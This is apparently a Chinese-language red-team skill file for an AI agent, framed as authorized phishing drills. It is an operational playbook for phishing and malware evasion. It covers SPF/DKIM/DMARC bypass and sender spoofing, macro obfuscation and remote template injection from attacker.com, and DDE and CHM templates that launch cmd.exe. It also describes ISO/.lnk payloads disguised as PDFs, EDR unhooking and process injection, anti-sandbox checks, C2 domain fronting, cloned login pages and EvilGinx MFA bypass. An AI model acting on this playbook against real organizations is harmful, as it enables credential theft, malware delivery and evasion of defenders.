---
description: 钓鱼攻击与免杀全链路。覆盖邮件伪造/SPF-DKIM-DMARC绕过、载荷免杀、样本投递格式绕过、钓鱼页面克隆、C2流量伪装。适用于红队授权钓鱼演练。
---

# 钓鱼免杀

## 核心原则

==钓鱼攻击链 = 邮件到达 + 目标打开 + 载荷执行 + 回连C2。任何一环失败（进垃圾箱/被网关拦截/杀软查杀/流量被检测）整个链路失效。==

> 前置: 目标信息收集参考 @recon.md。输入文件: `$OUTDIR/recon/emails.json`（邮箱列表+角色+置信度，格式定义见 recon「emails.json 格式」章节）。后续: 钓鱼获取初始权限后衔接 @post-exploit.md。

## 攻击链路

```
邮件投递 → 绕过邮件网关 → 目标打开 → 执行载荷 → 免杀落地 → C2回连
                                                      ↓
                                              沙箱检测对抗
```

---

## 1. 邮件网关绕过

### 1a. SPF 检查

```
SPF (Sender Policy Framework): 验证发件服务器 IP 是否在域名的 SPF 记录中。

检查目标域 SPF:
  dig TXT target.com | grep spf

SPF 绕过方法:
  1. SPF 软失败 (~all) → 大部分收件服务器仍接收，只标记
  2. SPF 记录过长 → DNS 查询超时 → SPF 检查被跳过
  3. SPF 记录不存在 → 无 SPF = 无检查
  4. SPF 递归查询 → 包含太多 include → 超过 10 次递归限制 → 跳过
  5. 同域名子域名 SPF 缺失 → 用子域名发信可能不受限制
```

### 1b. DKIM 检查

```
DKIM (DomainKeys Identified Mail): 邮件数字签名，验证邮件内容未被篡改。

绕过方法:
  1. DKIM 未配置 → 无需绕过
  2. DKIM 弱密钥（512位）→ 可暴力破解
  3. DKIM 选择器泄露 → 用泄露的选择器 + 弱密钥 = 可签名

检查 DKIM:
  dig TXT selector1._domainkey.target.com | grep dkim
```

### 1c. DMARC 检查

```
DMARC: 基于 SPF + DKIM 的联合验证策略。

检查目标域 DMARC:
  dig TXT _dmarc.target.com | grep dmarc

DMARC 策略解读:
  p=none   → 不做任何处理（最弱，绕过无影响）
  p=quarantine → 可疑邮件放入垃圾箱（影响投递率）
  p=reject  → 拒绝接收（需要完美绕过 SPF 或 DKIM）

  sp=none  → 子域名策略无限制
  pct=100  → 100% 邮件受此策略约束
  pct=50   → 只对 50% 邮件执行（50% 不检查）

绕过方法:
  1. DMARC p=none → 无需绕过
  2. DMARC p=quarantine → 目标仍可能看到邮件（在垃圾箱）
  3. SPF + DKIM 两者都绕过 → DMARC p=reject 也能过
  4. 用子域名（sp=none 或 sp=quarantine）
  5. DMARC 记录 DNS 查询超时 → 策略降级
```

### 1d. 邮件内容绕过反垃圾

```
避免触发反垃圾过滤:
  1. 减少链接数量（≤3 个）
  2. 避免短链接（bit.ly 等，已全部被标记为垃圾）
  3. 避免全图片邮件（0 文字 = 垃圾邮件标志）
  4. 文字:图片比例保持在 70:30 以上
  5. 避免垃圾关键词（free/money/urgent/winner/click here）
  6. 使用正式的邮件签名和公司 Logo
  7. 邮件头完整（Message-ID, In-Reply-To, References）
  8. 发件域名有 MX 记录
  9. IP 不在黑名单中（检查: mxtoolbox.com/blacklists）

HTML 邮件注意事项:
  - 不要用 JavaScript（全部被过滤）
  - CSS 内联（外部 CSS 会被剥离）
  - 不要用 iframe（被过滤）
  - 不要用 <form>（被过滤或标记）
  - 链接用 <a href=""> 纯文本显示（不要隐藏 URL）
```

### 1e. 发件人伪装

```
显示名伪装（最高成功率）:
  From: "IT Service Desk" <legit.sender@gmail.com>
  From: "Security Team" <noreply@target-sec.com>

相似域名注册:
  target.com → targét.com (xn--targt-2ya.com) / targeet.com / target.co

Reply-To 绕过:
  From: attacker@evil.com
  Reply-To: attacker@evil.com
  但邮件客户端只显示 From 的显示名，不显示实际地址

邮件客户端漏洞:
  Outlook/Apple Mail 对 From 头部的解析差异
  部分客户端优先显示 "Display Name" 不显示邮箱
```

---

## 2. 样本投递格式

==不同格式的载荷经过不同处理路径，绕过率差异很大。==

### 2a. 投递载体对比

| 格式 | 杀软检测率 | 邮件网关拦截率 | 用户点击率 | 备注 |
|------|----------|-------------|----------|------|
| Office 宏文档 | 高（宏被重点监控） | 高 | 中 | 需要用户启用宏 |
| Office DDE | 高 | 高 | 中 | 无需宏但弹出警告框 |
| Office 公式编辑器漏洞 | 低（CVE） | 低（旧格式） | 中 | 需要特定 Office 版本 |
| ISO 镜像 | 低（容器文件） | 中（部分网关过滤） | 中 | 需要用户挂载 |
| IMG/VHD 镜像 | 低 | 低 | 中 | 同上 |
| Windows .lnk 快捷方式 | 中 | 中 | 高 | 双击运行 |
| HTA 文件 | 中 | 中 | 高 | IE 渲染引擎执行 |
| CHM 编译帮助文件 | 低（冷门） | 低 | 中 | 需用户打开+点击 |
| WSF/VBS 脚本 | 高 | 高 | 中 | 旧格式容易被杀 |
| XLL Excel 插件 | 中（冷门） | 中 | 中 | Excel 直接加载 DLL 代码 |
| .reg 注册表文件 | 低 | 低 | 低 | 需导入注册表 |
| .chm → 执行 CMD | 低 | 低 | 中 | CHM 内嵌命令执行 |
| PDF 嵌入 JS | 中 | 中 | 中 | Adobe Reader 限制多 |
| .zip + .lnk 组合 | 低 | 中 | 高 | 解压后双击 |
| 下载链接（纯链接） | 无检测 | 高（URL 信誉） | 低 | 最简单但点击率最低 |

### 2b. Office 文档免杀

```
宏混淆（绕过 AMSI）:
  1. 变量/函数名随机化
  2. 字符串拼接（"D" + "o" + "w" + "n" + "l" + "o" + "a" + "d" + "F" + "i" + "l" + "e"）
  3. Chr() 编码（Chr(68) & Chr(111) → "Do"）
  4. WMI 替代 ShellExecute（Win32_Process.Create）
  5. 延迟执行（Sleep / Wait）绕过沙箱
  6. 环境检测（域用户/CPU数量/屏幕分辨率）绕过沙箱
  7. VBA stomping → 覆盖 VBA 源代码，保留 p-code 执行

远程模板注入:
  docx 的 .xml.rels 中指向 attacker.com/template.dotm
  → 主文档不含宏，模板从远程加载
  → 邮件网关看不到宏（文档本身干净）

DDE 注入（无需宏）:
  在文档中插入 DDE 字段：
  { DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }
```

### 2c. ISO/IMG 容器投递

```
为什么有效:
  - ISO 是只读文件系统，杀软不会挂载后扫描内部
  - 邮件网关通常不过滤 .iso 后缀
  - 用户双击 ISO → Windows 自动挂载 → 显示内部文件
  - 挂载后 .lnk 文件不显示 .lnk 后缀（Windows 默认隐藏）

标准构造:
  ISO 内含:
    ├── 正常文件（report.pdf 的图标）
    │   实际: report.pdf.lnk → 指向 payload.exe
    └── payload.exe（或 payload.dll 配合 rundll32）

lnk 构造:
  目标: C:\Windows\System32\cmd.exe
  参数: /c start /b payload.exe
  图标: %SystemRoot%\System32\imageres.dll,1（伪装 PDF 图标）
```

### 2d. CHM 投递

```
CHM 是 Windows 编译帮助文件，支持 HTML + ActiveX:

攻击手法:
  1. CHM 内嵌 HTML 页面
  2. 利用 <OBJECT> 标签调用 HHCTRL ActiveX 控件
  3. Click 事件触发 cmd.exe

示例（chm_template.html）:
  <!DOCTYPE html>
  <html>
  <head><title>Windows Help</title></head>
  <body>
    <OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"
      width=1 height=1>
      <PARAM name="Command" value="ShortCut">
      <PARAM name="Item1" value=",cmd.exe,/c calc.exe">
    </OBJECT>
    <script>x.Click();</script>
  </body>
  </html>

编译:
  hhc.exe template.hhp
```

---

## 3. 载荷免杀

### 3a. 检测规避层次

```
杀软检测层次：
  1. 静态签名（hash/字节匹配）→ 最容易被免杀绕过
  2. 启发式分析（API调用序列）→ 需要改变调用链
  3. 行为分析（进程链/网络/文件操作）→ 需要行为伪装
  4. 内存扫描（进程内存中的 shellcode）→ 需要加密/混淆
  5. EDR/ML 模型 → 最难绕过，需要深度定制
```

### 3b. 静态免杀

```
方法1: shellcode 加密/混淆
  - XOR/RC4/AES 加密，运行时解密
  - 随机密钥（每次生成不同 hash）
  - 分块加载 + 分块解密执行

方法2: shellcode 编码
  - IPv4/IPv6 编码
  - UUID/MAC 地址编码
  - 多种编码层叠（UUID → base64 → AES → XOR）

方法3: 资源隐藏
  - shellcode 放在 .rsrc 段
  - 压缩后用 inflate 解压

方法4: 编译器/链接器 tricks
  - 静态链接但符号剥离
  - 多文件分散敏感代码
  - 垃圾指令插入
  - 控制流平坦化（OLLVM 类似效果）

方法5: 签名工具盗用
  - 窃取有效数字签名（不建议——法律风险）
  - 过期签名可能仍被信任
```

### 3c. 运行时免杀

```
1. API Unhooking（恢复被 EDR hook 的 API）:
   - 从 ntdll.dll 磁盘文件重新加载干净的 .text 段
   - 覆盖内存中已被 hook 的 ntdll

2. 系统调用直接调用（绕过用户态 hook）:
   - 从 ntdll.dll 提取 syscall 号
   - 直接 syscall 指令（不经过 ntdll 的 EDR hook）

3. 进程注入（代码注入到其他进程）:
   - CreateRemoteThread / NtCreateThreadEx
   - Process Hollowing（创建挂起进程 → 取消映射 → 写入 shellcode → 恢复）
   - APC Injection（MainThread / EarlyBird）
   - AtomBombing（GlobalAtomTable → NtQueueApcThread）

4. DLL 侧载:
   - 利用合法签名程序的 DLL 搜索顺序
   - 把恶意 DLL 放在优先搜索路径

5. 进程挖空 (Process Doppelganging):
   - 在 NTFS 事务中创建临时文件 → 写入恶意代码 → 回滚事务
   - 文件从未实际存在于磁盘上
   - 启动后就是正常的进程

6. COM 劫持:
   - 修改 COM 注册表项
   - 合法程序加载 COM 组件时加载恶意 DLL

7. LOLBins（利用系统自带程序执行恶意代码）:
   - rundll32.exe / regsvr32.exe / mshta.exe / certutil / bitsadmin
   - wmic / cmstp / msiexec / cscript / wscript
```

### 3d. 行为免杀

```
1. 父进程伪装:
   - 从 explorer.exe 或 svchost.exe 注入
   - 不是从 Office/浏览器启动（沙箱特征）

2. 延迟执行 + 用户交互检测:
   - 等待鼠标移动 / 键盘输入
   - Sleep 后检查屏幕分辨率
   - 检查 CPU 核心数 / RAM 大小

3. 反沙箱/反虚拟机:
   - 检查运行时间（沙箱通常在 5 分钟内超时）
   - 检查域名/用户名（沙箱没有 AD 域）
   - 检查进程列表（沙箱进程少）
   - 检查特定 DLL 名称（如 sbiedll.dll = Sandboxie）

4. 网络伪装:
   - HTTPS 回连（不要用 HTTP 明文）
   - 域名前置（Domain Fronting: CDN → 真实 C2）
   - 流量伪装成正常 API 调用（模仿 Teams/OneDrive/Slack 等流量模式）
   - 抖动 beacon（不规则间隔，不固定 30s/60s）
```

---

## 4. C2 流量伪装

### 4a. 协议选择

```
优先级: HTTPS > HTTP > DNS > ICMP > 自定义 TCP

HTTPS:
  - 使用合法证书（Let's Encrypt 免费）
  - C2 域名模仿常见服务（cdn-targetname.com / api-targetname.com）
  - 路径伪装成正常 API（/api/v2/metrics / /v1/health）
  - 响应体中嵌入数据，伪装成 JSON 业务数据

DNS:
  - TXT/A/AAAA 记录携带数据
  - 查询域名伪造（data.cdn-target.com）
  - 文本记录伪装 base64 数据

CDN 前置 (Domain Fronting):
  - 使用 Cloudflare/Fastly/Azure CDN
  - SNI 设为合法高信誉域名
  - Host header 指向真实 C2
  - CDN 看到的 TLS SNI 是合法域，实际转发到 C2
```

### 4b. Beacon 配置

```
Cobalt Strike / Sliver / Havoc 配置要点:

1. 修改默认特征:
   - 改 C2 profile（Malleable C2 / Sliver C2 profile）
   - 改 User-Agent（模仿正常浏览器 UA）
   - 改 HTTP 头顺序（默认顺序是特征）
   - 改 TLS 指纹（JA3/JA4 指纹）
   - 移除或改 Cookie 名称
   - 改 URI 路径（device.php → api/v2/telemetry）

2. 流量抖动:
   - Jitter 系数 30-50%（不固定间隔）
   - Sleep 时间不要整倍数
   - 心跳和数据传输分开的间隔

3. 分段传输:
   - 大文件分块传输
   - 每个块加随机 padding

4. 心跳数据混淆:
   - 心跳中嵌入 base64 随机数据
   - 伪装成 Telemetry/Analytics 上报
```

---

## 5. 钓鱼页面克隆

### 5a. 页面克隆与凭证捕获

```
克隆目标:
  - O365/Exchange 登录页（最高成功率）
  - VPN/SSO 登录页
  - 内部系统登录页（OA/ERP/Jira/Confluence）

技术要点:
  1. 完整克隆 CSS/JS/Logo（确保页面无差异）
  2. 修改 form action → 指向捕获脚本
  3. 捕获脚本: 记录凭证 → 重定向回真实登录页（第二次登录成功）
  4. 域名选择: 相似域名 / xn-- 转义域名
  5. HTTPS 证书（Let's Encrypt，让浏览器显示🔒）
  6. 反机器人检测（Cloudflare Turnstile 验证码，避免安全研究员访问）
  7. IP 过滤（只允许目标地区 IP 访问，其他 IP 返回 404）
```

### 5b. 凭证捕获后

```
立即验证:
  1. 用捕获的凭证尝试登录真实系统
  2. 处理 MFA（如果有 MFA → 尝试 MFA 疲劳攻击或 EvilGinx 反向代理）
  3. 如果凭证失效 → 说明目标已警觉

EvilGinx 模式（反向代理 + 实时凭证 + Session Cookie 捕获）:
  不是克隆页面，是实时转发请求/响应
  可以捕获:
    - 用户名/密码
    - MFA TOTP code
    - Session Cookie（含 MFA 验证后的）
  → 直接拿完整 session 登录，无视 MFA
```

---

## 6. 沙箱对抗

```
邮件网关/EDR 的沙箱检测特征:

绕过方法:
  1. 用户交互触发（不自动执行）:
     - Office 宏需要用户点击启用
     - .lnk 需要用户双击
     - CHM 需要用户双击+确认安全警告

  2. 环境检测:
     - 检查 CPU 核心数（沙箱通常 1-2 核）→ <4 核不执行
     - 检查 RAM 大小（沙箱通常 <4GB）→ <4GB 不执行
     - 检查磁盘大小（沙箱通常 <100GB）→ <80GB 不执行
     - 检查最近文件/浏览器历史（沙箱为空）
     - 检查是否有 USB 设备连接
     - 检查是否有打印服务
     - 检查是否有域控制器可达

  3. 时间门控:
     - 时间炸弹（特定日期后才激活）
     - 延迟执行（Sleep 10 分钟，沙箱通常 5 分钟超时）
     - 等待用户活动（GetLastInputInfo）

  4. 反调试:
     - IsDebuggerPresent()
     - NtGlobalFlag 检查
     - TLS 回调中的反调试

  5. 特殊输入触发:
     - 需要用户在文档中输入特定内容
     - 需要点击特定位置
```

---

## 攻击链决策树

```
目标投递什么?

有邮件入口:
  外部发信 → 绕过网关（SPF/DKIM/DMARC检查）
    ├── 网关绕过成功 → 发送载荷
    └── 网关严格 → 注册相似域名 / 用第三方邮件服务（SendGrid/Mailgun）

无邮件入口:
  内部已立足 → 直接投递到内部共享文件夹 / Teams消息 / Slack消息
    ├── 社工方式: "紧急IT通知.docx" 放到内部文件服务器
    └── 利用已有权限: 直接推送 GPO / SCCM / 远程执行

目标打开后:
  执行载荷
    ├── 启用宏 → Office 宏执行
    ├── 解压 → .lnk 双击
    ├── 挂载 → .iso 内 .lnk 双击
    └── 点击链接 → 下载可执行文件
        ├── 浏览器下载 → SmartScreen 检测
        ├── 签名 → 有效签名绕过 SmartScreen
        └── 未签名 → 需要用户点击"仍要运行"

C2 回连:
  ├── HTTPS 直连 C2（最常用）
  ├── CDN 前置（隐蔽）
  ├── DNS 隧道（极隐蔽但慢）
  └── 代理链（多跳中转）

免杀失败:
  ├── 换格式（Office → ISO → XLL → CHM）
  ├── 换混淆方式（XOR → AES → 自定义算法）
  ├── 换执行方式（DLL→EXE→Shellcode→LOLBins）
  ├── 加沙箱对抗（环境检测+延迟执行+用户交互）
  └── 从零重写（不用公开 C2，自己写简单的）
```

---

## 知识库路由

| 场景 | KB 路径 | 关键内容 |
|------|---------|---------|
| 免杀技术 | `05-免杀与Webshell/免杀/` | shellcode加载/混淆/编码 |
| Webshell | `05-免杀与Webshell/Webshell/` | 各类 webshell 免杀 |
| C2搭建 | `07-红队基建/C2搭建/` | CS/MSF/Sliver 搭建与配置 |
| 域前置 | `07-红队基建/CS域前置/` | CDN 域前置技巧 |
| 钓鱼工具 | `06-工具与命令/钓鱼/` | 钓鱼邮件模板/工具 |
| 文件传输 | `06-工具与命令/文件传输/` | 载荷传输方式 |